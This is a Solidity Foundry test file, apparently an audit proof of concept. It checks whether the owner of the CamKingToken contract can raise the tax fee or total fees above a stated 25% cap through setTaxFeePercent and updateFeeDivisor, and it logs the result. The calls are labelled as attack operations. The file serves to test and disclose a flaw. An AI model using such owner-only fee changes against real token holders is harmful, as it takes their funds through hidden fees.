// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/CamKingToken.sol";

contract MockUniswapV2Factory {
    function createPair(address, address) external pure returns (address) {
        return address(0x123456789);
    }
}

contract CamKingTokenFeeTest is Test {
    CamKingToken token;
    address constant UNISWAP_ROUTER = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address constant WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address owner = makeAddr("owner");
    
    function setUp() public {
        // Deploy mock factory
        MockUniswapV2Factory mockFactory = new MockUniswapV2Factory();
        
        // Mock Uniswap router calls
        vm.etch(UNISWAP_ROUTER, new bytes(0)); // Create dummy contract at router address
        vm.mockCall(
            UNISWAP_ROUTER,
            abi.encodeWithSignature("factory()"),
            abi.encode(address(mockFactory))
        );
        vm.mockCall(
            UNISWAP_ROUTER,
            abi.encodeWithSignature("WETH()"),
            abi.encode(WETH)
        );
        
        // Deploy token contract as owner
        vm.startPrank(owner);
        token = new CamKingToken();
        vm.stopPrank();
    }

    // Test that owner can set tax fee beyond the 25% limit using setTaxFeePercent
    function testExceedFeeLimit_setTaxFeePercent() public {
        // Before state
        console.log("--- BEFORE setTaxFeePercent ---");
        uint256 taxFeeBefore = token._taxFee();
        uint256 totalFeeBefore = token._totalFee();
        uint256 autoLpDivisorBefore = token.autoLpDivisor();
        uint256 devDivisorBefore = token.devDivisor();
        uint256 marketingDivisorBefore = token.marketingDivisor();
        console.log("_taxFee: %s", taxFeeBefore);
        console.log("_totalFee: %s", totalFeeBefore);
        console.log("autoLpDivisor: %s", autoLpDivisorBefore);
        console.log("devDivisor: %s", devDivisorBefore);
        console.log("marketingDivisor: %s", marketingDivisorBefore);
        
        // Attack operation
        console.log("--- Trigger: setTaxFeePercent(260) ---");
        vm.startPrank(owner);
        token.setTaxFeePercent(260); // 26%
        vm.stopPrank();
        
        // After state
        console.log("--- AFTER setTaxFeePercent ---");
        uint256 taxFeeAfter = token._taxFee();
        uint256 totalFeeAfter = token._totalFee();
        uint256 autoLpDivisorAfter = token.autoLpDivisor();
        uint256 devDivisorAfter = token.devDivisor();
        uint256 marketingDivisorAfter = token.marketingDivisor();
        console.log("_taxFee: %s", taxFeeAfter);
        console.log("_totalFee: %s", totalFeeAfter);
        console.log("autoLpDivisor: %s", autoLpDivisorAfter);
        console.log("devDivisor: %s", devDivisorAfter);
        console.log("marketingDivisor: %s", marketingDivisorAfter);

        // Vulnerability verification
        if (taxFeeAfter > 250) {
            console.log("Vulnerability Exists: Tax fee exceeded 25%% limit");
        } else {
            console.log("Vulnerability not Exist: Tax fee within allowed limit");
        }
    }

    // Test that owner can set total fee beyond the 25% limit using updateFeeDivisor
    function testExceedFeeLimit_updateFeeDivisor() public {
        // Before state
        console.log("--- BEFORE updateFeeDivisor ---");
        uint256 taxFeeBefore = token._taxFee();
        uint256 totalFeeBefore = token._totalFee();
        uint256 autoLpDivisorBefore = token.autoLpDivisor();
        uint256 devDivisorBefore = token.devDivisor();
        uint256 marketingDivisorBefore = token.marketingDivisor();
        console.log("_taxFee: %s", taxFeeBefore);
        console.log("_totalFee: %s", totalFeeBefore);
        console.log("autoLpDivisor: %s", autoLpDivisorBefore);
        console.log("devDivisor: %s", devDivisorBefore);
        console.log("marketingDivisor: %s", marketingDivisorBefore);
        
        // Attack operation
        console.log("--- Trigger: updateFeeDivisor(150, 100, 100) ---");
        vm.startPrank(owner);
        token.updateFeeDivisor(150, 100, 100);
        vm.stopPrank();
        
        // After state
        console.log("--- AFTER updateFeeDivisor ---");
        uint256 taxFeeAfter = token._taxFee();
        uint256 totalFeeAfter = token._totalFee();
        uint256 autoLpDivisorAfter = token.autoLpDivisor();
        uint256 devDivisorAfter = token.devDivisor();
        uint256 marketingDivisorAfter = token.marketingDivisor();
        console.log("_taxFee: %s", taxFeeAfter);
        console.log("_totalFee: %s", totalFeeAfter);
        console.log("autoLpDivisor: %s", autoLpDivisorAfter);
        console.log("devDivisor: %s", devDivisorAfter);
        console.log("marketingDivisor: %s", marketingDivisorAfter);

        // Vulnerability verification
        if (totalFeeAfter > 250) {
            console.log("Vulnerability Exists: Total fees exceeded 25%% limit");
        } else {
            console.log("Vulnerability not Exist: Total fees within allowed limit");
        }
    }
}